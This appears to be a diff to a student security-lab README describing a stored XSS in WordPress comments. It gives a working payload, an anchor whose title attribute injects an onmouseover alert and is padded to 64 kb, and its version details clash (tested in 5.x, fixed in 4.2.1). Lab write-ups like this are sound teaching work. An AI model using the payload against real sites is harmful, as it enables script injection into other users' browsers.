@@ -14,7 +14,7 @@ Time spent: 20 hours spent in total
   - Vulnerability types: XSS (side note: I noticed Wordpress has way too many XSS vulnerabilities)
   - Tested in version: 5.1.53 and 5.5.41.
   - Fixed in version: 4.2.1
-- [ ] GIF Walkthrough: <img src="" alt="">
+- [ ] GIF Walkthrough: <img src="xss_vulnerability.gif" alt="XSS inside Comment">
 - [ ] Steps to recreate: You need to add the following while creating your comment "<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>". I generated some 64kb text with an online generator and followed the guide on https://klikki.fi/wordpress-4-2-core-stored-xss/
 - [ ] Affected source code:
   - [Link 1] (https://wpscan.com/vulnerability/8051e64b-f73e-45ce-a853-02b8e425155b)
